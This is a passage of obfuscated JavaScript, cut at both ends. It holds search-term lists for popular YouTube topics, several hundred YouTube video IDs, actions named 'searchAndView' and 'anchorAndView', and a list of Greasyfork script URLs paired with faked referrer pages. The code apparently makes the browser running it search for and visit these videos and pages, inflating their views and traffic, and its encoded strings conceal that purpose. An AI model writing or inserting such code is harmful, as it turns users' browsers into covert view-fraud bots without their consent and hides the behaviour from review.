searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x6ee + 0x1c76 + -0x235a)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x21b4 + -0xa90 + -0x1627 * -0x2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x3 * 0x2c2 + 0x1396 * -0x1 + 0x1bdf);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    X(0x1b, 'XlrT') + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    X(0xf, 'W5$q') + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    X(0x14, 'GatH') + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    X(0x17, 'bXi)') + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    X(0x12, 'XlrT') + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    W(0x20) + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    X(0x8, 'H9!^') + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    W(0x2) + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    X(0x1e, 'CPlc') + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    W(0x16) + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + X(0x9, '%25c') + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x15, 'Sh&3') + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': W(0xc) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x21) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
